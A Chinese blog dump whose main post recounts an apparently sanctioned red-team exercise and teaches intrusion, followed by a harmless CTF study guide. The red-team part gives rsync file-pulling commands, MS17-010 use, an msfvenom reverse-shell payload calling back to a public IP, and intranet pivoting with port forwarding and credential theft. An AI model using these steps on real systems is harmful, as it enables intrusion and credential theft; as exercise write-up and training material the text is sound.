class="string">"show_date_time()"</span>, <span class="number">1e3</span>),</span><br><span class="line">BirthDay = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">"1/30/2019 00:00:00"</span>),</span><br><span class="line">today = <span class="keyword">new</span> <span class="built_in">Date</span>,</span><br><span class="line">timeold = today.getTime() - BirthDay.getTime(),</span><br><span class="line">sectimeold = timeold / <span class="number">1e3</span>,</span><br><span class="line">secondsold = <span class="built_in">Math</span>.floor(sectimeold),</span><br><span class="line">msPerDay = <span class="number">864e5</span>,</span><br><span class="line">e_daysold = timeold / msPerDay,</span><br><span class="line">daysold = <span class="built_in">Math</span>.floor(e_daysold),</span><br><span class="line">e_hrsold = <span class="number">24</span> * (e_daysold - daysold),</span><br><span class="line">hrsold = <span class="built_in">Math</span>.floor(e_hrsold),</span><br><span class="line">e_minsold = <span class="number">60</span> * (e_hrsold - hrsold),</span><br><span class="line">minsold = <span class="built_in">Math</span>.floor(<span class="number">60</span> * (e_hrsold - hrsold)),</span><br><span class="line">seconds = <span class="built_in">Math</span>.floor(<span class="number">60</span> * (e_minsold - minsold)),</span><br><span class="line">span_dt_dt.innerHTML = <span class="string">"7inyの博客已运行"</span> + daysold + <span class="string">"天"</span></span><br><span class="line">&#125;</span><br><span class="line">show_date_time()</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>span&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo倒腾 </tag>
            
            <tag> hexo美化 </tag>
            
            <tag> 自定义友情链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RedTeam体验</title>
      <link href="/bad7feff.html"/>
      <url>/bad7feff.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019081701.jpg" alt=""><br><a id="more"></a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p> 以下内容，由Stalker成员交流总结，<code>7iny</code>整理。从去年下半年省赛接触渗透，那时我觉得sql注入分值很重。现在才懂得原来内网和权限才是最有价值的东西。这篇文章分为手术前(这部分是yiyangqianxi分享的信息收集内容)、手术中(这部分是手术期间遇到的漏洞)、手术后(这部分是yiyangqianxi的手术总结，我就不造轮子了直接分享他的文章)。经历了这么多，这一件件故事都是有着因果关系的。我希望这篇文章能对学弟学妹们有所帮助。</p><h1 id="手术前"><a href="#手术前" class="headerlink" title="手术前"></a>手术前</h1><ul><li>因为热爱，所以执着。</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><blockquote><p> from: stalker–yiyangqianxi</p></blockquote><h3 id="给定条件"><a href="#给定条件" class="headerlink" title="给定条件"></a>给定条件</h3><ul><li>单位名称和单位的主站网址 </li></ul><h4 id="三种情况"><a href="#三种情况" class="headerlink" title="三种情况"></a>三种情况</h4><p>1.一般这些政府网站的主站都是托管<code>政务云</code>也就是说 你即使拿到了shell 其实并不是它真正的服务器 是托管的政务云服务器</p><p>这种政务云一般的特征是  C段上都是政府网站 部署的WAF都是一样的 DNS解析是一样的</p><p>所以碰到这种网站 它的优先级是最低的</p><p>2.很多个服务器放在同一个机房里 也就是你去C段查询 发现有很多政府网站 但是他们部署的waf不一样 dns解析也不一样</p><p>这种网站 它的C段是有价值的 在你的目标站点没有突破点的时候 可以通过C段上的其他站点做突破点</p><p>3.托管个人企业的政府网站 它的特征是 同一C段下很多不相关的网站 这种网站的C段是没有去探测的意义了</p><p>所以托管个人企业的优先级最高 突破的难度最低</p><h4 id="相关工具及操作"><a href="#相关工具及操作" class="headerlink" title="相关工具及操作"></a>相关工具及操作</h4><p>Wafw00f：查看使用何种WAF。github<a href="https://github.com/sandrogauci/wafw00f" rel="external nofollow" target="_blank">下载</a><br>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install wafw00f</span><br></pre></td></tr></table></figure></p><p>DNS查看：nslookup;<code>windows</code>自带</p><p>找真实ip的方法是:找子域名,子域名解析出来的ip可能没有用cdn。</p><p>端口扫描：nmap有时候会扫不出来，如果这个ip你觉得很重要值得去深入挖掘的话。就用msf的syn扫描</p><ul><li>msf 端口扫描模块之syn<br>msf 在 auxiliary 辅助模块下有一个 scanner 扫描分类，其下有一个 portscan 端口扫描，里面有进行端口扫描的基本，不是很多，这里可以使用 search 来搜索下 portscan 关键字，常用的有 tcp、syn 等<blockquote><p>search portscan</p></blockquote></li></ul><blockquote><p>use auxiliary/scanner/portscan/syn</p></blockquote><p>配置并扫描<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set RHOSTS x.x.x.x</span><br><span class="line">set THREADS 100</span><br><span class="line">show options</span><br></pre></td></tr></table></figure></p><p>找到的真实ip后去扫C段，看属于上面三种情况的哪种。</p><p>云悉:<a href="http://www.yunsee.cn/" rel="external nofollow" target="_blank">官网</a>,看web服务器,中间件,cms信息</p><p>web服务器中间件的漏洞:<a href="https://www.freebuf.com/articles/web/192063.html" rel="external nofollow" target="_blank">参考文章</a></p><p>扫目录:御剑.把403的状态也选上，像有些<a href="http://www.rar" rel="external nofollow" target="_blank">www.rar</a>  web.config你可以扫到 但是访问不了 是403</p><p>查看同一ip的网站:<a href="http://stool.chinaz.com/same" rel="external nofollow" target="_blank">工具</a></p><p>读取文件：进后台了或者你找到任意文件读取/下载,读取文件</p><p><strong>小技巧</strong> ：如果C段一个ip开了80端口，访问发现403 ，也可以扫下它的目录</p><h1 id="手术中"><a href="#手术中" class="headerlink" title="手术中"></a>手术中</h1><p>在手术期间，严老板的思路让我拿到了第一个shell也让师弟有了开疆辟土的任务。师弟疯狂的通过旁站刷分。分享几个有意思的漏洞，交流学习一下</p><h2 id="rsync未授权访问漏洞"><a href="#rsync未授权访问漏洞" class="headerlink" title="rsync未授权访问漏洞"></a>rsync未授权访问漏洞</h2><p>这个是师兄找到的，当我看到这个思路时感觉，这个洞太高端了，直接让某系统所有信息泄露。</p><p>师兄通过端口扫描发现有端口提供了rsync服务,然后你懂的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rsync IP::   //这是在默认条件下没有改变默认的端口，默认密码是::</span><br><span class="line">rsync --port=xxx ip::  //如果修改了默认端口就需要指定端口，这里就是需要自己指定47900端口</span><br><span class="line">rsync -avz ip::www /tmp   //-avz是下载文件的命令，前一个是目标内容，后一个是自己指定存储在本地的路径</span><br><span class="line">rsync -avz --port=xxx ip::dddd /tmp</span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/85e368193dc2" rel="external nofollow" target="_blank">参考文章</a></p><h2 id="一个没申请到CNVD的XSS"><a href="#一个没申请到CNVD的XSS" class="headerlink" title="一个没申请到CNVD的XSS"></a>一个没申请到CNVD的XSS</h2><p>当时是某平台的机器人自助窗口，随手测试了一下XSS,还真有,拿其他站点试了一下，也是一样存在漏洞的。可惜影响不大没申请到CNVD</p><h2 id="一个应该可以申请CNVD的sql注入"><a href="#一个应该可以申请CNVD的sql注入" class="headerlink" title="一个应该可以申请CNVD的sql注入"></a>一个应该可以申请CNVD的sql注入</h2><p>当时Danie1测试了一个二级域名，随手测出来了一个注入，因为属于一个二级域名一个单位的系统，我觉得应该算一个0day.</p><h2 id="一个建站系统的注入"><a href="#一个建站系统的注入" class="headerlink" title="一个建站系统的注入"></a>一个建站系统的注入</h2><p>学弟在打旁站时，发现多个旁站使用了同一套建站系统，在同一个参数存在sql注入，果断批量刷该类旁站的注入了，在比赛期间靠这个漏洞学弟疯狂输出.</p><h2 id="一个赖皮的蓝方"><a href="#一个赖皮的蓝方" class="headerlink" title="一个赖皮的蓝方"></a>一个赖皮的蓝方</h2><p>师兄在C段渗透的过程中找到一个未绑定域名的站点并拿下了shell,发现为内网地址，通过搜索发现该地址为该单位的内网地址，没绑定域名，蓝方否认是其财产。MMP否认完第二天就悄悄加固了。</p><h2 id="骚思路"><a href="#骚思路" class="headerlink" title="骚思路"></a>骚思路</h2><p>思路来源，手术期间某晚某邮师兄想使用工作室的服务器，使用某软件不稳定，我随口说了一句使用学校的VPN连接。师兄后来说体验还不错，这为我后来想用VPN打内网提供了思路。<br>在手术期间，内网和权限是爸爸，一般思路是拿到shell打内网。唯一一个shell的服务器不稳定没办法，因为有个手术对象是学校，最后一天学弟直接借了一个<code>VPN账号</code>开打。第一次现学现卖，没什么经验，用msf打445的ms17-010获取权限。10个网段打下来3台服务器，1台PC。30台设备存在0708漏洞。</p><p>ps:时间紧很多思路没上来，结合其他队伍的分享回头细想，我应该添加用户开3389,收集数据库，web配置等账号密码信息，撞机器，每撞一台收集一次丰富字典。抓密码<code>mimikata</code>、<code>getpasswd</code>。撞库<code>ntscan</code></p><h2 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h2><p>第一次现学现卖，<a href="https://www.se7ensec.cn/2019/04/01/渗透学校某内网服务器" rel="external nofollow" target="_blank">参考文章</a>按照这篇文章我一步步的打了没有打到。文章中他是先拿的cmdshell再尝试拿meterpreter。严老板说要加个set payload windows/x64/meterpreter/bind_tcp才能打不同网段的设备。32位的为set payload windows/meterpreter/bind_tcp。时间仓促没仔细研究原理。后来打到了3台服务器，1台PC。很满意了，现学现卖收获不菲。这个漏洞不太稳定，我打一台服务器打第二次又失败了。</p><h1 id="手术后"><a href="#手术后" class="headerlink" title="手术后"></a>手术后</h1><ul><li><code>yiyangqianxi</code>的渗透总结</li></ul><h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p>渗透测试的本质就是信息搜集，不管是渗透前，渗透中，还是渗透后。信息搜集都会使整个渗透过程变得有思路，有目标，有路可走。</p><p>信息搜集<br>不管是我刚开始学习渗透时，还是找学长重新入门渗透的时候，第一步告诉我的都是信息搜集，但是在不同的阶段，我对信息搜集的理解也不太一样。很多时候我拿到一个网站，对其就上一顿工具扫这个扫那个，其实都是瞎猫碰死耗子，误打误撞发现了哪里有个漏洞点，就算进了后台，拿到webshell，又懵了，不知道要做什么了。</p><p>在这段时间的学习和实践中，我慢慢开始领悟到信息搜集的重要性和多样性。不只是御剑nmap扫了一下网站就够了，从分析网站的结构到判断资产信息都是我们需要考虑的。</p><p>拿到一个网站，我们最先看到就是域名。域名可以给到我们什么信息呢？</p><h2 id="1、判断它属于什么类型网站。"><a href="#1、判断它属于什么类型网站。" class="headerlink" title="1、判断它属于什么类型网站。"></a>1、判断它属于什么类型网站。</h2><p>是学校政府，还是公司，是大型企业网站，还是小型个人网站，是众多旁站的一个小站，还是一个大主站。这很大程度上决定了一次渗透的成功与否。</p><p>学校网站：具有很多子站，内网中会有很多服务器（内网渗透会有大收获），C段有利用价值，信息搜集阶段较繁琐，但一旦找到突破口则会很容易造成很大影响。</p><p>政府网站：政府网站分为三种类型1、政务云 许多政府网站放在同一个云平台上 难度最大 2、自建机房 许多政府网站在同一个C段上 难度最低 3、个人企业搭建的阿里云/腾讯云平台 难度第二。 其实政府网站不是好目标 如果不是被授权的任务，个人不推荐选择。</p><p>大型企业网站：特别大的没挖过，中等的企业网站很多也会选择云服务器，即使拿到webshell也很难突破防火墙等安全策略的干扰，并且后渗透的收获不大。</p><p>小型个人网站：有一部分都是不怎么管理的网站，或者是交给其他专门做网站的公司管理，弱口令的可能性较大，即使没有弱口令，总会有可利用的漏洞点，这个作为目标还是不错的。</p><p>所以拿到一个网站看到域名，什么edu：学校 gov：政府 这种没有授权最好不要碰。</p><h2 id="2、判断网站的结构和语言。"><a href="#2、判断网站的结构和语言。" class="headerlink" title="2、判断网站的结构和语言。"></a>2、判断网站的结构和语言。</h2><p>云悉是一个很好的指纹识别工具，它可以识别出网站所使用的cms、web服务器、中间件、脚本语言、数据库、操作系统等等对我们有利的信息。<br><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/1.png" alt=""></p><p>虽然这张图上啥都没识别出来啊。那识别出来的东西我们该怎么利用呢？<br>Cms：知道cms我们就可以去查这个cms的目录结构，已知漏洞，利用默认的路径找到后台，就可以尝试弱口令，爆破之类的了。要是能找到版本号，也就能更精准的找到漏洞。<br>Web服务器：如apache、iis、nginx，都有其对应的漏洞 如apache的解析漏洞，iis的解析漏洞（iis还有cve2017-7269） nginx是一个反向代理服务器，可以很好的保护内网的服务器，与之类似的还有Tengine。<br>Web中间件：weblogic、tomcat、JBOSS 也有对应的漏洞，如常见的weblogic反序列化漏洞。<br>脚本语言：知道了网站的脚本语言，我们可以更好的搜集网站的目录，有些网站还可以解析多种语言。<br>数据库：我们在sql注入的时候，虽然大多数时候都是尝试mysql的语句（因为最简单啊），但其实还有一些数据库语言是有些不一样的，像access数据库一般都是爆破方式，一些小的工具（穿山甲）有时候比sqlmap更好用。<br>操作系统：操作系统有那么多漏洞就不用我多说了吧，windows提权较linux简单多了！</p><h2 id="3、IP好像没那么简单。"><a href="#3、IP好像没那么简单。" class="headerlink" title="3、IP好像没那么简单。"></a>3、IP好像没那么简单。</h2><p>我们直接ping一个网站的域名得到的ip就是这个网站真实的ip了吗？<br>不，它还有可能是CDN（一种加速服务）。<br>和目标不在同一个地点的ip就一定是CDN了吗？<br>不，它还可能是云服务器，或者是托管个人企业搭建的服务器。</p><p>那我们要怎么样找到真实的ip呢？<br>可以用微步在线查看历史解析ip<br><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2.png" alt=""><br>在这里面可能会有真实ip。<br>有时候一些网站的子域名并不会挂CDN（不是所有人都那么有钱的啊） 所以爆破子域名后看ip也可找到真实ip。</p><h2 id="4、咋有这么多子域名。"><a href="#4、咋有这么多子域名。" class="headerlink" title="4、咋有这么多子域名。"></a>4、咋有这么多子域名。</h2><p>Layer子域名挖掘机真好用！<br>有时候我们的渗透目标没有思路的时候，往往可以去它的旁站子站看看，有时候会碰到一些老站点，会有一些新的思路！<br>Ps：某学校就是一个子域名的web漏洞导致内网被打穿。。。<br>有时候子域名还会出现网站的后台之类的让我们惊喜的页面，虽然可能会有点繁琐，但我们有了更多攻击的点了！</p><h2 id="5、C段咋也这么多啊。"><a href="#5、C段咋也这么多啊。" class="headerlink" title="5、C段咋也这么多啊。"></a>5、C段咋也这么多啊。</h2><p>C段是什么呢？<br>一个ip例如：192.168.109.135 它的C段就是 192.168.109.0-255<br>那它有什么用呢？<br>我们想想，在一个局域网内，我们都在同一个网段下，那当然也处在同一个C段下啦（当然还要看子网掩码） 不过大多数情况子网掩码都是 255.255.255.0 （网络基础知识）<br>C段查询既可以用nmap，msf 也可以在线查询。在线查询我一般用 那个phpinfo.me</p><p>所以有可能你的目标机器没有可利用的点，你去C段找一找有没有和它是同一单位或是同一企业的网站，类似于攻击子站旁站了。</p><h2 id="6、我把端口给忘了。"><a href="#6、我把端口给忘了。" class="headerlink" title="6、我把端口给忘了。"></a>6、我把端口给忘了。</h2><p>端口应该都知道很多常见的  22：ssh  80：web服务 445：smb  3306：mysql           3389：远程桌面<br>对一个ip进行端口扫描我们最常用的方法就是nmap，但是有时候nmap不一定扫的出来，我们可以换个工具，msf的portscan模块。<br><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/3.png" alt=""><br>Tcp和syn都可以用，虽然扫的比较慢，但是有时候会有一些惊喜。<br>那扫出来一些敏感的端口，我们就可以尝试利用一些漏洞，例如22端口我们可以爆破，445端口的永恒之蓝漏洞和ms08-067，3389最近将会出exp的 cve2019-0708。还有很多漏洞，就不一一说了。</p><h2 id="后渗透阶段："><a href="#后渗透阶段：" class="headerlink" title="后渗透阶段："></a>后渗透阶段：</h2><p>拿到webshell的过程我就不说了，想说也说不完，主要说说拿到了一个webshell之后我们要做些什么吧。首先就是要知道自己的权限有多大（能不能执行cmd命令，能不能进其他的目录，能不能上传文件等等）<br>而我一般喜欢msf的meterpreter会话，我们可以生成一个后门来得到一个反弹shell，后门可以生成很多种类型（exe的 php的等等都可以） 只要运行那个后门就可以了。</p><p>Msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=你的ip  lport=监听的端口 -f exe &gt;test.exe<br>-f :输出木马的类型（可自行选择）<br>但是这里会遇到一个问题，这是一个反弹木马，但是你要攻击的服务器要怎么把会话弹到你的电脑上呢？你的电脑并没有公网ip，它无法访问到，也就无法返回会话了，这时候我们就要用到内网穿透了。</p><p>有两种方法：<br>一、用自己的公网服务器和frp来进行穿透<br>（<a href="https://blog.csdn.net/u013144287/article/details/78589643/）" rel="external nofollow" target="_blank">https://blog.csdn.net/u013144287/article/details/78589643/）</a></p><p>二、利用工具natapp来将自己主机进行端口转发</p><p>使用natapp就是傻瓜式操作 按照官网的教程配置好<br><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/4.png" alt=""><br>就如图所示 这时候去ping这个url得到公网ip<br><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/5.png" alt=""><br>然后构造msf木马</p><p>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=112.74.89.58 LPORT=45075 -f exe &gt; test.exe<br>上传到服务器一个可读可写目录下<br><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/6.png" alt=""><br>在本地msf进行监听<br>use exploit/multi/handler</p><p>set PAYLOAD windows/x64/meterpreter/reverse_tcp</p><p>set LHOST 0.0.0.0 //可以自动获取ip</p><p>set LPORT 4444</p><p>exploit</p><p>然后再用菜刀的虚拟终端运行上传的木马，就可以得到一个meterpreter会话。</p><p>我们得到了一个meterpreter会话之后<br>getuid 查自己是什么用户<br>systeminfo 查看服务器系统信息 打了什么补丁<br>getsystem 尝试用msf自带的提权脚本提权</p><p>无法提权的话，我们就可以尝试本台服务器上没有打补丁的一些漏洞。但这些漏洞提权都会再次生成一个meterpreter会话，反弹向我们本机的ip，同样，我们无法接收到会话。所以我们可以选择payload为bind_tcp，也就是我们正向去连接它。<br><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/7.png" alt=""><br>我们还可以利用烂土豆提权（本地上传一个exe来偷取管理员令牌）</p><p>提权还有很多种方法，我们都可以尝试，最重要的是思路。<br>可能我们无法提权这台服务器，但是不用太着急，我们来试试它的内网。</p><p>在meterpreter会话界面下 使用命令 arp -a 或者 run get_local_subnets 获取服务器的内网网段 例如我们得到的这台服务器内网网段为  192.168.123.0<br>那我们将当前的会话加入此条路由中<br>background<br>route add 192.168.123.0  255.255.255.0  1(1是你的session，第几个会话就填几)<br>route print 查看是否已添加成功</p><p>现在我们就实现了路由转发 打通了一条去往服务器内网的路<br>我们现在就可以扫描它的内网了 当然优先扫描永恒之蓝啦！<br><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/8.png" alt=""><br>这样可以扫描到整个C段上的服务器有哪台有永恒之蓝漏洞，扫到以后就可以直接打那台服务器啦，不过还是之前说过的，打内网服务器的时候要设置payload为bind_tcp，不然会话是无法回来的。那现在我们拿到了内网中的另一台机器，可以用mimikatz来读取管理员的密码，可是我们现在的跳板机权限不够，无法3389连上去，那内网这台也就连不上去了。所以要怎么办呢？就要用到端口转发了。</p><p>我们可以把内网中另一台我们已获得权限的机器的3389端口转发到我们跳板机的某个端口，这样访问这个端口就相当于访问内网机器中的3389端口了。<br>使用<br>portfwd add -l 跳板机要设置的端口 -r 内网机器ip -p 3389<br>那么就可以通过访问 跳板机的这个端口来访问内网机器的3389了。</p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Red Team </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF入坑</title>
      <link href="/5e558f39.html"/>
      <url>/5e558f39.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/20190805.jpg" alt=""></p><a id="more"></a><h1 id="CTF学习"><a href="#CTF学习" class="headerlink" title="CTF学习"></a>CTF学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本内容主要以解题模式为学习重点，由Stalker-16成员(Danie1,7iny)整理。</p><h2 id="day01–7iny"><a href="#day01–7iny" class="headerlink" title="day01–7iny"></a>day01–7iny</h2><h3 id="解题模式CTF赛题目类别与能力对应"><a href="#解题模式CTF赛题目类别与能力对应" class="headerlink" title="解题模式CTF赛题目类别与能力对应"></a>解题模式CTF赛题目类别与能力对应</h3><p>· Web-Web应用的漏洞挖掘和利用<br>· PWN-逆向分析、漏洞挖掘、漏洞利用、安全编程<br>· Reverse Engineering-逆向分析、安全编程<br>· Crypto-密码、逆向分析、安全编程<br>· PPC（Professional Programming and Coding）-安全编程<br>· Forensic-网络流量分析、隐写分析、系统取证等<br>· Recon-社工、情报搜集分析</p><h3 id="相应的赛题要求"><a href="#相应的赛题要求" class="headerlink" title="相应的赛题要求"></a>相应的赛题要求</h3><p>PWN、Reverse偏重对汇编、逆向的理解<br>Crypto偏重对数学、算法的深入学习<br>Web偏重对技巧沉淀、快速搜索能力的挑战<br>Misc则更为复杂，所有与计算机安全挑战有关的都算在其中</p><h3 id="如何入门–如何学？"><a href="#如何入门–如何学？" class="headerlink" title="如何入门–如何学？"></a>如何入门–如何学？</h3><p>1、恶补基础知识（有基础的跳过此步）</p><blockquote><p>都需要学的内容：<br>Linux基础、计算机组成原理、操作系统原理、网络协议分析<br>PWN+Reverse+Crypto随机搭配：<br>IDA工具使用（f5插件）、逆向工程、密码学、缓冲区溢出等<br>Web+Misc组合：<br>网络安全、内网渗透、数据库安全等</p></blockquote><p>2、尝试从脑洞开始（hackgame）</p><blockquote><p>1.<a href="https://prompt.ml/0" rel="external nofollow" target="_blank">xss练习平台</a></p><p>2.<a href="https://redtiger.labs.overthewire.org/" rel="external nofollow" target="_blank">sql注入挑战</a></p></blockquote><p>3、从基础题目出发</p><blockquote><p>刷题站点：</p><p>1.<a href="https://www.ichunqiu.com" rel="external nofollow" target="_blank">i春秋</a> </p><p>2.<a href="https://adworld.xctf.org.cn/" rel="external nofollow" target="_blank">xctf攻防世界</a></p><p>3.<a href="http://www.wechall.net/challs" rel="external nofollow" target="_blank">国外CTF题库</a></p><p>4.<a href="https://microcorruption.com/login" rel="external nofollow" target="_blank">国外PWN+Reverse方向</a></p><p>5.<a href="https://smashthestack.org/" rel="external nofollow" target="_blank">ssh连接玩wargame</a></p><p>6.<a href="https://overthewire.org/wargames/" rel="external nofollow" target="_blank">老牌wargame</a></p><p>7.<a href="https://pwnable.kr/play.php" rel="external nofollow" target="_blank">pwn题库</a></p></blockquote><p>4、学习信息安全专业知识</p><blockquote><p>书籍</p><p>PWN+Reverse+Crypto随机搭配：<br>RE for Beginners（逆向工程入门）<br>IDA Pro权威指南<br>揭秘家庭路由器0day漏洞挖掘技术<br>自己动手写操作系统<br>黑客攻防技术宝典：系统实战篇</p><p>Web+Misc组合：<br>Web应用安全权威指南<br>Web前端黑客技术揭秘<br>黑客秘籍-渗透测试实用指南<br>黑客攻防技术宝典Web实战篇<br>代码审计：企业级Web代码安全架构</p></blockquote><p>5、锻炼体力而耐力</p><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><blockquote><p>以下是由各大大佬整理的工具库，全部放在了github上</p><p>1.<a href="https:/github.com/truongkma/ctf-tools" target="_blank" rel="noopener">工具库1</a> </p><p>2.<a href="https://github.com/zardus/ctf-tools" rel="external nofollow" target="_blank">工具库2</a></p><p>3.<a href="https:/github.com/TUCTF/Tools" target="_blank" rel="noopener">工具库3</a></p></blockquote><h3 id="MISC学习"><a href="#MISC学习" class="headerlink" title="MISC学习"></a>MISC学习</h3><p>学习MISC的好处：MISC可能是切入CTF竞赛领域、培养兴趣的最佳入口<br>1.基础知识/技能面、逆向思维<br>2.“解谜”能力、“脑洞”大开</p><p>1.国外：Google Map、Earth、Street View<br>2.国内：Baidu地图、卫星视图、全景视图：map.baidu.com腾讯地图、卫星、街景：map.qq.com<br>· 从网络世界到物理世界<br>1.IP2Location IP地址（因特网上的虚拟地址）&gt;现实世界中的具体地理位置<br>2.IP2Location数据库：WHOIS数据库，GeolP，IP2Location，纯真数据库（QQIP查询使用）<br>· Google image search<br>1.搜索图片含义和外观类似图片</p><p>2.Encoding Analysis 编码分析<br>· 二进制编码<br>· 十六进制编码<br>1.单字节：00-FF·ASClI字符编码<br>2.字母：A-Z：41-5A；a-Z：61-7A<br>· Base64编码<br>1.基于64个可打印字符来表示二进制数据的表示方法<br>2.字符集：大小写字母各26个，10个数字，加号“+”，斜杠“/”，一共64个字符，等号“=”用来作为后缀用途<br>· Huffman Code-无损压缩编码，01串显示<br>· 条形码：宽度不等的多个黑条和空白，按照一定的编码规则排列，用以表达一组信息的图形标识符<br>·国际标准</p><ul><li>EAN-13：商品条码标准，13位数字</li><li>Code-39：39字符</li><li>Code-128：128字符<br>·条形码</li><li>在线条码生成器/识别器</li><li>ZXing-多平台条形码生成、扫码库<br>条形码在线解码：<a href="https://online-barcode-reader.inliteresearch.com/" rel="external nofollow" target="_blank">网站</a><br>题目1：Barcode.jpeg<br>· 二维码：用某种特定几何图形按一定规律在平面（二维方向上）分布的黑白相间的图形记录数据符号信息<br>1.堆叠式/行排式二维条码：Code 16K、Code49、PDF417<br>2.矩阵式二维码：QR CODE<blockquote><p>常见题目二维码、条形码的恢复<br>参考文章：<a href="https://www.freebuf.com/geek/204516.html" rel="external nofollow" target="_blank">freebuf</a><br>练习平台：<a href="http://daka.whaledu.com:9999/" rel="external nofollow" target="_blank">蓝鲸安全打卡练习场</a><br>参考writeup:<a href="https://www.jianshu.com/p/27b8be64811e" rel="external nofollow" target="_blank">简书</a></p></blockquote></li></ul><p>练习蓝鲸安全打卡练习场题目：<br>1.破碎的心–画图按住ctrl，按上下键不断还原<br>2.黑白打字机–画图ctrl+shift+i反色，图片隐写解密，86版五笔对照表</p><blockquote><p>图片隐写解密软件<a href="http://www.oyksoft.com/soft/19151.html" rel="external nofollow" target="_blank">下载地址</a></p></blockquote><p>3.Forensic Analysis 取证分析</p><p>· 取证分析-取证对象<br>1.文件file<br>2.磁盘disk<br>3.网络数据包pcap<br>4.内存dump<br>5.系统镜像image<br>· 取证分析挑战目标<br>1.一般为发现在取证对象中隐藏的Flag（代表要取证的敏感信息）<br>2.取证分析通常和隐写分析联系在一起<br>· 文件格式分析常用命令和工具<br>1.基本命令file、identify、strings：用于文件类型探测<br>2.winhex、UE：用于直接察看文件16进制数据<br>3.binwalk：分析二进制文件，提取其中隐藏文件等<br>· 需要了解常见文件特征串<br>1.<a href="http://en.wikipedia.org/wiki/List" rel="external nofollow" target="_blank">http://en.wikipedia.org/wiki/List</a> of file signatures<br>2.特别是JPEG、PNG、GIF、BMP等图片文件，ZIP、RAR、TAR、7z等压缩文件，mp3、wma、avi等音视频文件</p><p>音频取证<br>· <a href="https://iboxgalileogiftedschoolor-my.sharepoint.com/personal/wangshusong_auooo_com/_layouts/15/guestaccess.aspx?docid=0f7d6900c9d0e49f6847482800cec4f0c&amp;authkey=AZdJzcQaggeMsOlvhXc-cZs&amp;e=zV8BNd" rel="external nofollow" target="_blank">Audacity</a>音频处理软件，查看声音波形</p><p><a href="https://www.sqlsec.com/2018/01/ctfwav.html" rel="external nofollow" target="_blank">国光音频取证总结</a></p><p>磁盘取证<br>· 磁盘分区格式<br>1.Windows:FAT12-&gt;FAT16-&gt;FAT32-&gt;NTFS<br>2.Linux:EXT2-&gt;EXT3-&gt;EXT4<br>3.FAT主磁盘结构</p><p>| 主引导区 | 文件分配表#1 | 文件分配表#2 | 根目录 | 其他所有数据剩下磁盘空间 |</p><p>删除文件<br>·目录表中文件名第一字节E5<br>·文件恢复和取证工具<br>EasyRecovery、MedAnalyze、FTK<br>网络数据包Pcap取证分析<br>· Wireshark工具<br>书籍《Wireshark抓包分析实战》<br>· 流量统计和会话列表<br>· 善用过滤规则，找出关注的网络流纪录<br>· 流重组：Follow TCP Stream<br>· 常见网络通信协议的理解<br>IP/TCP、UDP/HTTP、DNS、.….<br>·提取流中的文件数据</p><p>内存与image镜像取证分析<br>· 内存取证<br>1.Volatility内存镜像分析工具<br>2.解析Windows/Linux/MacOSX内存结构<br>3.分析当前运行进程列表、进程内存数据等<br>4.根据题目提示寻找线索和思路，提取分析指定进程的特定内存数据<br>· Image镜像取证<br>1.Binwalk<br>2.根据题目提示提取镜像中需关注的文件<br>3.分析提取文件中的应用层数据</p><p>4.Steganalysis 隐写分析</p><p>隐写术<br>· 隐写载体<br>1.文本<br>2.图片<br>3.音频<br>4.视频<br>· 隐写方法和工具<br>1.RSD、LSB、DCT<br>2.<a href="https://en.wikipedia.org/wiki/Steganography_tools" rel="external nofollow" target="_blank">https://en.wikipedia.org/wiki/Steganography_tools</a></p><p><a href="https://www.sqlsec.com/2018/01/ctfimg.html" rel="external nofollow" target="_blank">国光图片隐写总结</a></p><p>· 识别隐写<br>1.统计分析<br>2.Noise floor consistency analysis 噪声一致性分析<br>· 隐写识别工具<br>1.Stegdetect<br>2.StegSecret<br>3.GFE Stealth<br>· 隐写分析<br>1.<a href="http://www.garykessler.net/library/fsc_stego.html" rel="external nofollow" target="_blank">http://www.garykessler.net/library/fsc_stego.html</a></p><h2 id="day01–Danie1"><a href="#day01–Danie1" class="headerlink" 